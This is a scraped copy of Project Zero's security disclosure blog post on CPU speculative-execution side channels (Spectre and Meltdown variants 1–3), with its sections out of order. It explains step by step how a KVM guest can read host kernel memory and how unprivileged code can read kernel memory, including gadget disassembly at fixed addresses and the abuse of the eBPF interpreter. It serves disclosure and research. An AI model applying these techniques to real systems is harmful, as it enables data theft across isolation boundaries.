load address (in the case of KVM: the low 20 bits of the load address of kvm-intel.ko). Reverse-Engineering Branch Predictor Internals This subsection describes how we reverse-engineered the internals of the Haswell branch predictor. Some of this is written down from memory, since we didn't keep a detailed record of what we were doing. We initially attempted to perform BTB injections into the kernel using the generic predictor, using the knowledge from prior research that the generic predictor only looks at the lower half of the source address and that only a partial target address is stored. This kind of worked - however, the injection success rate was very low, below 1%. (This is the method we used in our preliminary PoCs for method 2 against modified hypervisors running on Haswell.) We decided to write a userspace test case to be able to more easily test branch predictor behavior in different situations. Based on the assumption that branch predictor state is shared between hyperthreads [10], we wrote a program of which two instances are each pinned to one of the two logical processors running on a specific physical core, where one instance attempts to perform branch injections while the other measures how often branch injections are successful. Both instances were executed with ASLR disabled and had the same code at the same addresses. The injecting process performed indirect calls to a function that accesses a (per-process) test variable; the measuring process performed indirect calls to a function that tests, based on timing, whether the per-process test variable is cached, and then evicts it using CLFLUSH. Both indirect calls were performed through the same callsite. Before each indirect call, the function pointer stored in memory was flushed out to main memory using CLFLUSH to widen the speculation time window. Additionally, because of the reference to \"recent program behavior\" in Intel's optimization manual, a bunch of conditional branches that are always taken were inserted in front of the indirect call. In this test, the injection success rate was above 99%, giving us a base setup for future experiments. We then tried to figure out the details of the prediction scheme. We assumed that the prediction scheme uses a global branch history buffer of some kind. To determine the duration for which branch information stays in the history buffer, a conditional branch that is only taken in one of the two program instances was inserted in front of the series of always-taken conditional jumps, then the number of always-taken conditional jumps (N) was varied. The result was that for N=25, the processor was able to distinguish the branches (misprediction rate under 1%), but for N=26, it failed to do so (misprediction rate over 99%). Therefore, the branch history buffer had to be able to store information about at least the last 26 branches. The code in one of the two program instances was then moved around in memory. This revealed that only the lower 20 bits of the source and target addresses have an influence on the branch history buffer. Testing with different types of branches in the two program instances revealed that static jumps, taken conditional jumps, calls and returns influence the branch history buffer the same way; non-taken conditional jumps don't influence it; the address of the last byte of the source instruction is the one that counts; IRETQ doesn't influence the history buffer state (which is useful for testing because it permits creating program flow that is invisible to the history buffer). Moving the last conditional branch before the indirect call around in memory multiple times revealed that the branch history buffer contents can be used to distinguish many different locations of that last conditional branch instruction. This suggests that the history buffer doesn't store a list of small history values; instead, it seems to be a larger buffer in which history data is mixed together. However, a history buffer needs to \"forget\" about past branches after a certain number of new branches have been taken in order to be useful for branch prediction. Therefore, when new data is mixed into the history buffer, this can not cause information in bits that are already present in the history buffer to propagate downwards - and given that, upwards combination of information probably wouldn't be very useful either. Given that branch prediction also must be very fast, we concluded that it is likely that the update function of the history buffer left-shifts the old history buffer, then XORs in the new state (see diagram). If this assumption is correct, then the history buffer contains a lot of information about the most recent branches, but only contains as many bits of information as are shifted per history buffer update about the last branch about which it contains any data. Therefore, we tested whether flipping different bits in the source and target addresses of a jump followed by 32 always-taken jumps with static source and target allows the branch prediction to disambiguate an indirect call. [11] With 32 static jumps in between, no bit flips seemed to have an influence, so we decreased the number of static jumps until a difference was observable. The result with 28 always-taken jumps in between was that bits 0x1 and 0x2 of the target and bits 0x40 and 0x80 of the source had such an influence; but flipping both 0x1 in the target and 0x40 in the source or 0x2 in the target and 0x80 in the source did not permit disambiguation. This shows that the per-insertion shift of the history buffer is 2 bits and shows which data is stored in the least significant bits of the history buffer. We then repeated this with decreased amounts of fixed jumps after the bit-flipped jump to determine which information is stored in the remaining bits. Reading host memory from a KVM guest Locating the host kernel Our PoC locates the host kernel in several steps. The information that is determined and necessary for the next steps of the attack consists of: lower 20 bits of the address of kvm-intel.ko full address of kvm.ko full address of vmlinux Looking back, this is unnecessarily complicated, but it nicely demonstrates the various techniques an attacker can use. A simpler way would be to first determine the address of vmlinux, then bisect the addresses of kvm.ko and kvm-intel.ko. In the first step, the address of kvm-intel.ko is leaked. For this purpose, the branch history buffer state after guest entry is dumped out. Then, for every possible value of bits 12..19 of the load address of kvm-intel.ko, the expected lowest 16 bits of the history buffer are computed based on the load address guess and the known offsets of the last 8 branches before guest entry, and the results are compared against the lowest 16 bits of the leaked history buffer state. The branch history buffer state is leaked in steps of 2 bits by measuring misprediction rates of an indirect call with two targets. One way the indirect call is reached is from a vmcall instruction followed by a series of N branches whose relevant source and target address bits are all zeroes. The second way the indirect call is reached is from a series of controlled branches in userspace that can be used to write arbitrary values into the branch history buffer. Misprediction rates are measured as in the section \"Reverse-Engineering Branch Predictor Internals\", using one call target that loads a cache line and another one that checks whether the same cache line has been loaded. With N=29, mispredictions will occur at a high rate if the controlled branch history buffer value is zero because all history buffer state from the hypercall has been erased. With N=28, mispredictions will occur if the controlled branch history buffer value is one of 0<<(28 2), 1<<(28 2), 2<<(28 2), 3<<(28 2) - by testing all four possibilities, it can be detected which one is right. Then, for decreasing values of N, the four possibilities are {0|1|2|3}<<(28*2) | (history_buffer_for(N+1) >> 2). By repeating this for decreasing values for N, the branch history buffer value for N=0 can be determined. At this point, the low 20 bits of kvm-intel.ko are known; the next step is to roughly locate kvm.ko. For this, the generic branch predictor is used, using data inserted into the BTB by an indirect call from kvm.ko to kvm-intel.ko that happens on every hypercall; this means that the source address of the indirect call has to be leaked out of the BTB. kvm.ko will probably be located somewhere in the range from 0xffffffffc0000000 to 0xffffffffc4000000, with page alignment (0x1000). This means that the first four entries in the table in the section \"Generic Predictor\" apply; there will be 24-1=15 aliasing addresses for the correct one. But that is also an advantage: It cuts down the search space from 0x4000 to 0x4000/24=1024. To find the right address for the source or one of its aliasing addresses, code that loads data through a specific register is placed at all possible call targets (the leaked low 20 bits of kvm-intel.ko plus the in-module offset of the call target plus a multiple of 220) and indirect calls are placed at all possible call sources. Then, alternatingly, hypercalls are performed and indirect calls are performed through the different possible non-aliasing call sources, with randomized history buffer state that prevents the specialized prediction from working. After this step, there are 216 remaining possibilities for the load address of kvm.ko. Next, the load address of vmlinux can be determined in a similar way, using an indirect call from vmlinux to kvm.ko. Luckily, none of the bits which are randomized in the load address of vmlinux are folded together, so unlike when locating kvm.ko, the result will directly be unique. vmlinux has an alignment of 2MiB and a randomization range of 1GiB, so there are still only 512 possible addresses. Because (as far as we know) a simple hypercall won't actually cause indirect calls from vmlinux to kvm.ko, we instead use port I/O from the status register of an emulated serial port, which is present in the default configuration of a virtual machine created with virt-manager. The only remaining piece of information is which one of the 16 aliasing load addresses of kvm.ko is actually correct. Because the source address of an indirect call to kvm.ko is known, this can be solved using bisection: Place code at the various possible targets that, depending on which instance of the code is speculatively executed, loads one of two cache lines, and measure which one of the cache lines gets loaded. Identifying cache sets The PoC assumes that the VM does not have access to hugepages.To discover eviction sets for all L3 cache sets with a specific alignment relative to a 4KiB page boundary, the PoC first allocates 25600 pages of memory. Then, in a loop, it selects random subsets of all remaining unsorted pages such that the expected number of sets for which an eviction set is contained in the subset is 1, reduces each subset down to an eviction set by repeatedly accessing its cache lines and testing whether the cache lines are always cached (in which case they're probably not part of an eviction set) and attempts to use the new eviction set to evict all remaining unsorted cache lines to determine whether they are in the same cache set [12]. Locating the host-virtual address of a guest page Because this attack uses a FLUSH+RELOAD approach for leaking data, it needs to know the host-kernel-virtual address of one guest page. Alternative approaches such as PRIME+PROBE should work without that requirement. The basic idea for this step of the attack is to use a branch target injection attack against the hypervisor to load an attacker-controlled address and test whether that caused the guest-owned page to be loaded. For this, a gadget that simply loads from the memory location specified by R8 can be used - R8-R11 still contain guest-controlled values when the first indirect call after a guest exit is reached on this kernel build. We expected that an attacker would need to either know which eviction set has to be used at this point or brute-force it simultaneously; however, experimentally, using random eviction sets works, too. Our theory is that the observed behavior is actually the result of L1D and L2 evictions, which might be sufficient to permit a few instructions worth of speculative execution. The host kernel maps (nearly?) all physical memory in the physmap area, including memory assigned to KVM guests. However, the location of the physmap is randomized (with a 1GiB alignment), in an area of size 128PiB. Therefore, directly bruteforcing the host-virtual address of a guest page would take a long time. It is not necessarily impossible; as a ballpark estimate, it should be possible within a day or so, maybe less, assuming 12000 successful injections per second and 30 guest pages that are tested in parallel; but not as impressive as doing it in a few minutes. To optimize this, the problem can be split up: First, brute-force the physical address using a gadget that can load from physical addresses, then brute-force the base address of the physmap region. Because the physical address can usually be assumed to be far below 128PiB, it can be brute-forced more efficiently, and brute-forcing the base address of the physmap region afterwards is also easier because then address guesses with 1GiB alignment can be used. To brute-force the physical address, the following gadget can be used: ffffffff810a9def: 4c 89 c0 mov rax,r8 ffffffff810a9df2: 4d 63 f9 movsxd r15,r9d ffffffff810a9df5: 4e 8b 04 fd c0 b3 a6 mov r8,QWORD PTR [r15*8-0x7e594c40] ffffffff810a9dfc: 81 ffffffff810a9dfd: 4a 8d 3c 00 lea rdi,[rax+r8*1] ffffffff810a9e01: 4d 8b a4 00 f8 00 00 mov r12,QWORD PTR [r8+rax*1+0xf8] ffffffff810a9e08: 00 This gadget permits loading an 8-byte-aligned value from the area around the kernel text section by setting R9 appropriately, which in particular permits loading page_offset_base, the start address of the physmap. Then, the value that was originally in R8 - the physical address guess minus 0xf8 - is added to the result of the previous load, 0xfa is added to it, and the result is dereferenced. Cache set selection To select the correct L3 eviction set, the attack from the following section is essentially executed with different eviction sets until it works. Leaking data At this point, it would normally be necessary to locate gadgets in the host kernel code that can be used to actually leak data by reading from an attacker-controlled location, shifting and masking the result appropriately and then using the result of that as offset to an attacker-controlled address for a load. But piecing gadgets together and figuring out which ones work in a speculation context seems annoying. So instead, we decided to use the eBPF interpreter, which is built into the host kernel - while there is no legitimate way to invoke it from inside a VM, the presence of the code in the host kernel's text section is sufficient to make it usable for the attack, just like with ordinary ROP gadgets. The eBPF interpreter entry point has the following function signature: static unsigned int __bpf_prog_run(void ctx, const struct bpf_insn insn) The second parameter is a pointer to an array of statically pre-verified eBPF instructions to be executed - which means that __bpf_prog_run() will not perform any type checks or bounds checks. The first parameter is simply stored as part of the initial emulated register state, so its value doesn't matter. The eBPF interpreter provides, among other things: multiple emulated 64-bit registers 64-bit immediate writes to emulated registers memory reads from addresses stored in emulated registers bitwise operations (including bit shifts) and arithmetic operations To call the interpreter entry point, a gadget that gives RSI and RIP control given R8-R11 control and controlled data at a known memory location is necessary. The following gadget provides this functionality: ffffffff81514edd: 4c 89 ce mov rsi,r9 ffffffff81514ee0: 41 ff 90 b0 00 00 00 call QWORD PTR [r8+0xb0] Now, by pointing R8 and R9 at the mapping of a guest-owned page in the physmap, it is possible to speculatively execute arbitrary unvalidated eBPF bytecode in the host kernel. Then, relatively straightforward bytecode can be used to leak data into the cache. Variant 3: Rogue data cache load Basically, read Anders Fogh's blogpost: https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ In summary, an attack using this variant of the issue attempts to read kernel memory from userspace without misdirecting the control flow of kernel code. This works by using the code pattern that was used for the previous variants, but in userspace. The underlying idea is that the permission check for accessing an address might not be on the critical path for reading data from memory to a register, where the permission check could have significant performance impact. Instead, the memory read could make the result of the read available to following instructions immediately and only perform the permission check asynchronously, setting a flag in the reorder buffer that causes an exception to be raised if the permission check fails. We do have a few additions to make to Anders Fogh's blogpost: \"Imagine the following instruction executed in usermode mov rax,[somekernelmodeaddress] It will cause an interrupt when retired, [...]\" It is also possible to already execute that instruction behind a high-latency mispredicted branch to avoid taking a page fault. This might also widen the speculation window by increasing the delay between the read from a kernel address and delivery of the associated exception. \"First, I call a syscall that touches this memory. Second, I use the prefetcht0 instruction to improve my odds of having the address loaded in L1.\" When we used prefetch instructions after doing a syscall, the attack stopped working for us, and we have no clue why. Perhaps the CPU somehow stores whether access was denied on the last access and prevents the attack from working if that is the case? \"Fortunately I did not get a slow read suggesting that Intel null\u2019s the result when the access is not allowed.\" That (read from kernel address returns all-zeroes) seems to happen for memory that is not sufficiently cached but for which pagetable entries are present, at least after repeated read attempts. For unmapped memory, the kernel address read does not return a result at all. Ideas for further research We believe that our research provides many remaining research topics that we have not yet investigated, and we encourage other public researchers to look into these. This section contains an even higher amount of speculation than the rest of this blogpost - it contains untested ideas that might well be useless. Leaking without data cache timing It would be interesting to explore whether there are microarchitectural attacks other than measuring data cache timing that can be used for exfiltrating data out of speculative execution. Other microarchitectures Our research was relatively Haswell-centric so far. It would be interesting to see details e.g. on how the branch prediction of other modern processors works and how well it can be attacked. Other JIT engines We developed a successful variant 1 attack against the JIT engine built into the Linux kernel. It would be interesting to see whether attacks against more advanced JIT engines with less control over the system are also practical - in particular, JavaScript engines. More efficient scanning for host-virtual addresses and cache sets In variant 2, while scanning for the host-virtual address of a guest-owned page, it might make sense to attempt to determine its L3 cache set first. This could be done by performing L3 evictions using an eviction pattern through the physmap, then testing whether the eviction affected the guest-owned page. The same might work for cache sets - use an L1D+L2 eviction set to evict the function pointer in the host kernel context, use a gadget in the kernel to evict an L3 set using physical addresses, then use that to identify which cache sets guest lines belong to until a guest-owned eviction set has been constructed. Dumping the complete BTB state Given that the generic BTB seems to only be able to distinguish 231-8 or fewer source addresses, it seems feasible to dump out the complete BTB state generated by e.g. a hypercall in a timeframe around the order of a few hours. (Scan for jump sources, then for every discovered jump source, bisect the jump target.) This could potentially be used to identify the locations of functions in the host kernel even if the host kernel is custom-built. The source address aliasing would reduce the usefulness somewhat, but because target addresses don't suffer from that, it might be possible to correlate (source,target) pairs from machines with different KASLR offsets and reduce the number of candidate addresses based on KASLR being additive while aliasing is bitwise. This could then potentially allow an attacker to make guesses about the host kernel version or the compiler used to build it based on jump offsets or distances between functions. Variant 2: Leaking with more efficient gadgets If sufficiently efficient gadgets are used for variant 2, it might not be necessary to evict host kernel function pointers from the L3 cache at all; it might be sufficient to only evict them from L1D and L2. Various speedups In particular the variant 2 PoC is still a bit slow. This is probably partly because: It only leaks one bit at a time; leaking more bits at a time should be doable. It heavily uses IRETQ for hiding control flow from the processor. It would be interesting to see what data leak rate can be achieved using variant 2. Leaking or injection through the return predictor If the return predictor also doesn't lose its state on a privilege level change, it might be useful for either locating the host kernel from inside a VM (in which case bisection could be used to very quickly discover the full address of the host kernel) or injecting return targets (in particular if the return address is stored in a cache line that can be flushed out by the attacker and isn't reloaded before the return instruction). However, we have not performed any experiments with the return predictor that yielded conclusive results so far. Leaking data out of the indirect call predictor We have attempted to leak target information out of the indirect call predictor, but haven't been able to make it work. Vendor statements The following statement were provided to us regarding this issue from the vendors to whom Project Zero disclosed this vulnerability: Intel Intel is committed to improving the overall security of computer systems. The methods described here rely on common properties of modern microprocessors. Thus, susceptibility to these methods is not limited to Intel processors, nor does it mean that a processor is working outside its intended functional specification. Intel is working closely with our ecosystem partners, as well as with other silicon vendors whose processors are affected, to design and distribute both software and hardware mitigations for these methods. For more information and links to useful resources, visit: https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&languageid=en-fr http://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf AMD AMD provided the following link: http://www.amd.com/en/corporate/speculative-execution ARM Arm recognises that the speculation functionality of many modern high-performance processors, despite working as intended, can be used in conjunction with the timing of cache operations to leak some information as described in this blog. Correspondingly, Arm has developed software mitigations that we recommend be deployed. Specific details regarding the affected processors and mitigations can be found at this website: https://developer.arm.com/support/security-update Arm has included a detailed technical whitepaper as well as links to information from some of Arm\u2019s architecture partners regarding their specific implementations and mitigations. Literature Note that some of these documents - in particular Intel's documentation - change over time, so quotes from and references to it may not reflect the latest version of Intel's documentation. https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf : Intel's optimization manual has many interesting pieces of optimization advice that hint at relevant microarchitectural behavior; for example: \"Placing data immediately following an indirect branch can cause a performance problem. If the data consists of all zeros, it looks like a long stream of ADDs to memory destinations and this can cause resource conflicts and slow down branch recovery. Also, data immediately following indirect branches may appear as branches to the branch predication [sic] hardware, which can branch off to execute other data pages. This can lead to subsequent self-modifying code problems.\" \"Loads can:[...]Be carried out speculatively, before preceding branches are resolved.\" \"Software should avoid writing to a code page in the same 1-KByte subpage that is being executed or fetching code in the same 2-KByte subpage of that is being written. In addition, sharing a page containing directly or speculatively executed code with another processor as a data page can trigger an SMC condition that causes the entire pipeline of the machine and the trace cache to be cleared. This is due to the self-modifying code condition.\" \"if mapped as WB or WT, there is a potential for speculative processor reads to bring the data into the caches\" \"Failure to map the region as WC may allow the line to be speculatively read into the processor caches (via the wrong path of a mispredicted branch).\" https://software.intel.com/en-us/articles/intel-sdm : Intel's Software Developer Manuals http://www.agner.org/optimize/microarchitecture.pdf : Agner Fog's documentation of reverse-engineered processor behavior and relevant theory was very helpful for this research. http://www.cs.binghamton.edu/~dima/micro16.pdf and https://github.com/felixwilhelm/mario_baslr : Prior research by Dmitry Evtyushkin, Dmitry Ponomarev and Nael Abu-Ghazaleh on abusing branch target buffer behavior to leak addresses that we used as a starting point for analyzing the branch prediction of Haswell processors. Felix Wilhelm's research based on this provided the basic idea behind variant 2. https://arxiv.org/pdf/1507.06955.pdf : The rowhammer.js research by Daniel Gruss, Cl\u00e9mentine Maurice and Stefan Mangard contains information about L3 cache eviction patterns that we reused in the KVM PoC to evict a function pointer. https://xania.org/201602/bpu-part-one : Matt Godbolt blogged about reverse-engineering the structure of the branch predictor on Intel processors. https://www.sophia.re/thesis.pdf : Sophia D'Antoine wrote a thesis that shows that opcode scheduling can theoretically be used to transmit data between hyperthreads. https://gruss.cc/files/kaiser.pdf : Daniel Gruss, Moritz Lipp, Michael Schwarz, Richard Fellner, Cl\u00e9mentine Maurice, and Stefan Mangard wrote a paper on mitigating microarchitectural issues caused by pagetable sharing between userspace and the kernel. https://www.jilp.org/ : This journal contains many articles on branch prediction. http://blog.stuffedcow.net/2013/01/ivb-cache-replacement/ : This blogpost by Henry Wong investigates the L3 cache replacement policy used by Intel's Ivy Bridge architecture. References [1] This initial report did not contain any information about variant 3. We had discussed whether direct reads from kernel memory could work, but thought that it was unlikely. We later tested and reported variant 3 prior to the publication of Anders Fogh's work at https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ . [2] The precise model names are listed in the section \"Tested Processors\". The code for reproducing this is in the writeup_files.tar archive in our bugtracker, in the folders userland_test_x86 and userland_test_aarch64. [3] The attacker-controlled offset used to perform an out-of-bounds access on an array by this PoC is a 32-bit value, limiting the accessible addresses to a 4GiB window in the kernel heap area. [4] This PoC won't work on CPUs with SMAP support; however, that is not a fundamental limitation. [5] linux-image-4.9.0-3-amd64 at version 4.9.30-2+deb9u2 (available at http://snapshot.debian.org/archive/debian/20170701T224614Z/pool/main/l/linux/linux-image-4.9.0-3-amd64_4.9.30-2%2Bdeb9u2_amd64.deb , sha256 5f950b26aa7746d75ecb8508cc7dab19b3381c9451ee044cd2edfd6f5efff1f8, signed via Release.gpg , Release , Packages.xz ); that was the current distro kernel version when I set up the machine. It is very unlikely that the PoC works with other kernel versions without changes; it contains a number of hardcoded addresses/offsets. [6] The phone was running an Android build from May 2017. [7] https://software.intel.com/en-us/articles/intel-sdm [8] https://software.intel.com/en-us/articles/avoiding-and-identifying-false-sharing-among-threads , section \"background\" [9] More than 215 mappings would be more efficient, but the kernel places a hard cap of 216 on the number of VMAs that a process can have. [10] Intel's optimization manual states that \"In the first implementation of HT Technology, the physical execution resources are shared and the architecture state is duplicated for each logical processor\", so it would be plausible for predictor state to be shared. While predictor state could be tagged by logical core, that would likely reduce performance for multithreaded processes, so it doesn't seem likely. [11] In case the history buffer was a bit bigger than we had measured, we added some margin - in particular because we had seen slightly different history buffer lengths in different experiments, and because 26 isn't a very round number. [12] The basic idea comes from http://palms.ee.princeton.edu/system/files/SP_vfinal.pdf , section IV, although the authors of that paper still used hugepages. \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html","title":"Reading privileged memory with a side channel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#reading-privileged-memory-with-a-side-channel","text":"Posted by Jann Horn, Project Zero We have discovered that CPU data cache timing can be abused to efficiently leak information out of mis-speculated execution, leading to (at worst) arbitrary virtual memory read vulnerabilities across local security boundaries in various contexts. Variants of this issue are known to affect many modern processors, including certain processors by Intel, AMD and ARM. For a few Intel and AMD CPU models, we have exploits that work against real software. We reported this issue to Intel, AMD and ARM on 2017-06-01 [1]. So far, there are three known variants of the issue: Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) Before the issues described here were publicly disclosed, Daniel Gruss, Moritz Lipp, Yuval Yarom, Paul Kocher, Daniel Genkin, Michael Schwarz, Mike Hamburg, Stefan Mangard, Thomas Prescher and Werner Haas also reported them; their [writeups/blogposts/paper drafts] are at: Spectre (variants 1 and 2) Meltdown (variant 3) During the course of our research, we developed the following proofs of concept (PoCs): A PoC that demonstrates the basic principles behind variant 1 in userspace on the tested Intel Haswell Xeon CPU, the AMD FX CPU, the AMD PRO CPU and an ARM Cortex A57 [2]. This PoC only tests for the ability to read data inside mis-speculated execution within the same process, without crossing any privilege boundaries. A PoC for variant 1 that, when running with normal user privileges under a modern Linux kernel with a distro-standard config, can perform arbitrary reads in a 4GiB range [3] in kernel virtual memory on the Intel Haswell Xeon CPU. If the kernel's BPF JIT is enabled (non-default configuration), it also works on the AMD PRO CPU. On the Intel Haswell Xeon CPU, kernel virtual memory can be read at a rate of around 2000 bytes per second after around 4 seconds of startup time. [4] A PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific (now outdated) version of Debian's distro kernel [5] running on the host, can read host kernel memory at a rate of around 1500 bytes/second, with room for optimization. Before the attack can be performed, some initialization has to be performed that takes roughly between 10 and 30 minutes for a machine with 64GiB of RAM; the needed time should scale roughly linearly with the amount of host RAM. (If 2MB hugepages are available to the guest, the initialization should be much faster, but that hasn't been tested.) A PoC for variant 3 that, when running with normal user privileges, can read kernel memory on the Intel Haswell Xeon CPU under some precondition. We believe that this precondition is that the targeted kernel memory is present in the L1D cache. For interesting resources around this topic, look down into the \"Literature\" section. A warning regarding explanations about processor internals in this blogpost: This blogpost contains a lot of speculation about hardware internals based on observed behavior, which might not necessarily correspond to what processors are actually doing. We have some ideas on possible mitigations and provided some of those ideas to the processor vendors; however, we believe that the processor vendors are in a much better position than we are to design and evaluate mitigations, and we expect them to be the source of authoritative guidance. The PoC code and the writeups that we sent to the CPU vendors are available here: https://bugs.chromium.org/p/project-zero/issues/detail?id=1272 .","title":"Reading privileged memory with a side-channel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#tested-processors","text":"Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz (called \"Intel Haswell Xeon CPU\" in the rest of this document) AMD FX(tm)-8320 Eight-Core Processor (called \"AMD FX CPU\" in the rest of this document) AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G (called \"AMD PRO CPU\" in the rest of this document) An ARM Cortex A57 core of a Google Nexus 5x phone [6] (called \"ARM Cortex A57\" in the rest of this document)","title":"Tested Processors"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#glossary","text":"retire: An instruction retires when its results, e.g. register writes and memory writes, are committed and made visible to the rest of the system. Instructions can be executed out of order, but must always retire in order. logical processor core: A logical processor core is what the operating system sees as a processor core. With hyperthreading enabled, the number of logical cores is a multiple of the number of physical cores. cached/uncached data: In this blogpost, \"uncached\" data is data that is only present in main memory, not in any of the cache levels of the CPU. Loading uncached data will typically take over 100 cycles of CPU time. speculative execution: A processor can execute past a branch without knowing whether it will be taken or where its target is, therefore executing instructions before it is known whether they should be executed. If this speculation turns out to have been incorrect, the CPU can discard the resulting state without architectural effects and continue execution on the correct execution path. Instructions do not retire before it is known that they are on the correct execution path. mis-speculation window: The time window during which the CPU speculatively executes the wrong code and has not yet detected that mis-speculation has occurred.","title":"Glossary"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-1-bounds-check-bypass","text":"This section explains the common theory behind all three variants and the theory behind our PoC for variant 1 that, when running in userspace under a Debian distro kernel, can perform arbitrary reads in a 4GiB region of kernel memory in at least the following configurations: Intel Haswell Xeon CPU, eBPF JIT is off (default state) Intel Haswell Xeon CPU, eBPF JIT is on (non-default state) AMD PRO CPU, eBPF JIT is on (non-default state) The state of the eBPF JIT can be toggled using the net.core.bpf_jit_enable sysctl.","title":"Variant 1: Bounds check bypass"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#theoretical-explanation","text":"The Intel Optimization Reference Manual says the following regarding Sandy Bridge (and later microarchitectural revisions) in section 2.3.2.3 (\"Branch Prediction\"): Branch prediction predicts the branch target and enables the processor to begin executing instructions long before the branch true execution path is known. In section 2.3.5.2 (\"L1 DCache\"): Loads can: [...] * Be carried out speculatively, before preceding branches are resolved. * Take cache misses out of order and in an overlapped manner. Intel's Software Developer's Manual [7] states in Volume 3A, section 11.7 (\"Implicit Caching (Pentium 4, Intel Xeon, and P6 family processors\"): Implicit caching occurs when a memory element is made potentially cacheable, although the element may never have been accessed in the normal von Neumann sequence. Implicit caching occurs on the P6 and more recent processor families due to aggressive prefetching, branch prediction, and TLB miss handling. Implicit caching is an extension of the behavior of existing Intel386, Intel486, and Pentium processor systems, since software running on these processor families also has not been able to deterministically predict the behavior of instruction prefetch. Consider the code sample below. If arr1->length is uncached, the processor can speculatively load data from arr1->data[untrusted_offset_from_caller]. This is an out-of-bounds read. That should not matter because the processor will effectively roll back the execution state when the branch has executed; none of the speculatively executed instructions will retire (e.g. cause registers etc. to be affected). struct array { unsigned long length; unsigned char data[]; }; struct array *arr1 = ...; unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; ... } However, in the following code sample, there's an issue. If arr1->length, arr2->data[0x200] and arr2->data[0x300] are not cached, but all other accessed data is, and the branch conditions are predicted as true, the processor can do the following speculatively before arr1->length has been loaded and the execution is re-steered: load value = arr1->data[untrusted_offset_from_caller] start a load from a data-dependent offset in arr2->data, loading the corresponding cache line into the L1 cache struct array { unsigned long length; unsigned char data[]; }; struct array arr1 = ...; / small array */ struct array arr2 = ...; / array of size 0x400 */ / >0x400 (OUT OF BOUNDS!) / unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; unsigned long index2 = ((value&1)*0x100)+0x200; if (index2 < arr2->length) { unsigned char value2 = arr2->data[index2]; } } After the execution has been returned to the non-speculative path because the processor has noticed that untrusted_offset_from_caller is bigger than arr1->length, the cache line containing arr2->data[index2] stays in the L1 cache. By measuring the time required to load arr2->data[0x200] and arr2->data[0x300], an attacker can then determine whether the value of index2 during speculative execution was 0x200 or 0x300 - which discloses whether arr1->data[untrusted_offset_from_caller]&1 is 0 or 1. To be able to actually use this behavior for an attack, an attacker needs to be able to cause the execution of such a vulnerable code pattern in the targeted context with an out-of-bounds index. For this, the vulnerable code pattern must either be present in existing code, or there must be an interpreter or JIT engine that can be used to generate the vulnerable code pattern. So far, we have not actually identified any existing, exploitable instances of the vulnerable code pattern; the PoC for leaking kernel memory using variant 1 uses the eBPF interpreter or the eBPF JIT engine, which are built into the kernel and accessible to normal users. A minor variant of this could be to instead use an out-of-bounds read to a function pointer to gain control of execution in the mis-speculated path. We did not investigate this variant further.","title":"Theoretical explanation"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#attacking-the-kernel","text":"This section describes in more detail how variant 1 can be used to leak Linux kernel memory using the eBPF bytecode interpreter and JIT engine. While there are many interesting potential targets for variant 1 attacks, we chose to attack the Linux in-kernel eBPF JIT/interpreter because it provides more control to the attacker than most other JITs. The Linux kernel supports eBPF since version 3.18. Unprivileged userspace code can supply bytecode to the kernel that is verified by the kernel and then: either interpreted by an in-kernel bytecode interpreter or translated to native machine code that also runs in kernel context using a JIT engine (which translates individual bytecode instructions without performing any further optimizations) Execution of the bytecode can be triggered by attaching the eBPF bytecode to a socket as a filter and then sending data through the other end of the socket. Whether the JIT engine is enabled depends on a run-time configuration setting - but at least on the tested Intel processor, the attack works independent of that setting. Unlike classic BPF, eBPF has data types like data arrays and function pointer arrays into which eBPF bytecode can index. Therefore, it is possible to create the code pattern described above in the kernel using eBPF bytecode. eBPF's data arrays are less efficient than its function pointer arrays, so the attack will use the latter where possible. Both machines on which this was tested have no SMAP, and the PoC relies on that (but it shouldn't be a precondition in principle). Additionally, at least on the Intel machine on which this was tested, bouncing modified cache lines between cores is slow, apparently because the MESI protocol is used for cache coherence [8]. Changing the reference counter of an eBPF array on one physical CPU core causes the cache line containing the reference counter to be bounced over to that CPU core, making reads of the reference counter on all other CPU cores slow until the changed reference counter has been written back to memory. Because the length and the reference counter of an eBPF array are stored in the same cache line, this also means that changing the reference counter on one physical CPU core causes reads of the eBPF array's length to be slow on other physical CPU cores (intentional false sharing). The attack uses two eBPF programs. The first one tail-calls through a page-aligned eBPF function pointer array prog_map at a configurable index. In simplified terms, this program is used to determine the address of prog_map by guessing the offset from prog_map to a userspace address and tail-calling through prog_map at the guessed offsets. To cause the branch prediction to predict that the offset is below the length of prog_map, tail calls to an in-bounds index are performed in between. To increase the mis-speculation window, the cache line containing the length of prog_map is bounced to another core. To test whether an offset guess was successful, it can be tested whether the userspace address has been loaded into the cache. Because such straightforward brute-force guessing of the address would be slow, the following optimization is used: 215 adjacent userspace memory mappings [9], each consisting of 24 pages, are created at the userspace address user_mapping_area, covering a total area of 231 bytes. Each mapping maps the same physical pages, and all mappings are present in the pagetables. This permits the attack to be carried out in steps of 231 bytes. For each step, after causing an out-of-bounds access through prog_map, only one cache line each from the first 24 pages of user_mapping_area have to be tested for cached memory. Because the L3 cache is physically indexed, any access to a virtual address mapping a physical page will cause all other virtual addresses mapping the same physical page to become cached as well. When this attack finds a hit\u2014a cached memory location\u2014the upper 33 bits of the kernel address are known (because 